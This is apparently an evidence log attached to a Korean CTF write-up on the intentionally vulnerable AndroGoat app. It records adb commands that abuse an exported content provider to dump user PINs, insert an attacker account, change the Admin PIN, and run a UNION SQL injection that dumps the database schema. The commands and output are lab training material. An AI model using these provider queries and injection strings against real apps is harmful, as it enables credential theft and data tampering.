---
{"title":"15_provider_console.txt","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"02_components/15_provider_console.txt · 콘솔·로그 기록 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `02_components/15_provider_console.txt` · 콘솔·로그 기록.

<pre><code>﻿# 일반 권한(uid 2000)에서 exported=true, 권한(permission) 없는 Provider 접근

## 1) 읽기: 전체 사용자 PIN 덤프
PS&gt; adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=2, username=root, pin=toor

## 2) 쓰기: 공격자 계정 삽입
PS&gt; adb shell su shell content insert --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind username:s:attacker --bind pin:s:0000

PS&gt; adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=4, username=attacker, pin=0000
Row: 3 id=2, username=root, pin=toor

## 3) 수정: Admin PIN 변경
PS&gt; adb shell su shell content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:hacked --where &quot;username=&#x27;Admin&#x27;&quot;
Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
android.database.sqlite.SQLiteException: no such column: Admin (code 1 SQLITE_ERROR): , while compiling: UPDATE user_pins SET pin=? WHERE username=Admin

PS&gt; adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where &quot;username=&#x27;Admin&#x27;&quot;
Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
android.database.sqlite.SQLiteException: no such column: Admin (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM user_pins WHERE (username=Admin) ORDER BY username

## 4) SQL 인젝션: projection 으로 다른 테이블(sqlite_master) 조회
PS&gt; adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --projection &quot;name,sql&quot;  --where &quot;1=0) UNION SELECT name,sql FROM sqlite_master --&quot;

## 5) 원상복구
PS&gt; adb shell su shell content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:Admin --where &quot;username=&#x27;Admin&#x27;&quot;
Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
android.database.sqlite.SQLiteException: no such column: Admin (code 1 SQLITE_ERROR): , while compiling: UPDATE user_pins SET pin=? WHERE username=Admin

PS&gt; adb shell su shell content delete --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where &quot;username=&#x27;attacker&#x27;&quot;
Error while accessing provider:owasp.sat.agoat.provider.userpinsprovider
android.database.sqlite.SQLiteException: no such column: attacker (code 1 SQLITE_ERROR): , while compiling: DELETE FROM user_pins WHERE username=attacker

PS&gt; adb shell su shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=4, username=attacker, pin=0000
Row: 3 id=2, username=root, pin=toor

## id: 2000 (shell)

## 3) 수정: Admin PIN 변경
$ content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:hacked --where username=&#x27;Admin&#x27;

$ content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where username=&#x27;Admin&#x27;
Row: 0 id=3, username=Admin, pin=hacked

## 4) SQL 인젝션: selection 으로 sqlite_master(DB 구조) 덤프
$ content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --projection username:pin --where 1=0) UNION SELECT name, sql FROM sqlite_master WHERE (1=1
Row: 0 username=android_metadata, pin=CREATE TABLE android_metadata (locale TEXT)
Row: 1 username=sqlite_sequence, pin=CREATE TABLE sqlite_sequence(name,seq)
Row: 2 username=user_pins, pin=CREATE TABLE user_pins (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL, pin TEXT NOT NULL)

## 5) 원상복구
$ content update --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --bind pin:s:Admin --where username=&#x27;Admin&#x27;

$ content delete --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins --where username=&#x27;attacker&#x27;

$ content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=2, username=root, pin=toor

</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
